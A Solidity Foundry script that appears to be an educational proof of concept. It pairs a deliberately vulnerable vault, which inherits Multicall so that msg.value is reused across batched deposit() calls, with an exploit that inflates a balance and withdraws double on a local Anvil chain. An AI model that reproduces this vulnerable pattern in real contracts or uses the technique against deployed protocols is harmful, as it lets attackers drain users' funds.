// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.13;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/base/Multicall.sol";

/// @notice Vulnerable contract that inherits Multicall
/// Problem: msg.value is only checked once in multicall,
/// so multiple deposits are counted, but ETH is only sent once.
contract MulticallConcrete is Multicall {
    mapping(address => uint256) public balanceOf;

    function deposit() external payable {
        require(msg.value > 0, "No ETH sent");
        balanceOf[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 bal = balanceOf[msg.sender];
        require(bal > 0, "Nothing to withdraw");
        balanceOf[msg.sender] = 0;
        payable(msg.sender).transfer(bal);
    }
}

/// @notice Exploit script
contract RunExploit is Script {
    function run() external {
        

        // Create attacker EOA (account 1 from Anvil)
        address attacker = vm.addr(1);
        vm.deal(attacker, 1 ether); // Give attacker 1 ETH

        console.log("=== Exploit PoC Start ===");
        console.log("Attacker address:", attacker);
        console.log("Attacker initial ETH balance:", attacker.balance);

        // Deploy vulnerable contract
        MulticallConcrete vault = new MulticallConcrete();
        console.log("Vault deployed at:", address(vault));

        // Prepare 2 deposit() calls
        bytes[] memory calls = new bytes[](2);
        calls[0] = abi.encodeWithSelector(vault.deposit.selector);
        calls[1] = abi.encodeWithSelector(vault.deposit.selector);

        // Execute multicall as attacker with only 1 ETH
        vm.prank(attacker);
        vault.multicall{value: 1 ether}(calls);

        // Check inflated balance
        console.log("Vault recorded attacker balance:", vault.balanceOf(attacker));

        // Add liquidity to vault so withdrawal succeeds
        vm.deal(address(vault), 2 ether);

        // Attacker withdraws double
        vm.prank(attacker);
        vault.withdraw();

        // Final attacker balance
        console.log("Attacker final ETH balance:", attacker.balance);
        console.log("=== Exploit PoC End ===");

        
    }
}

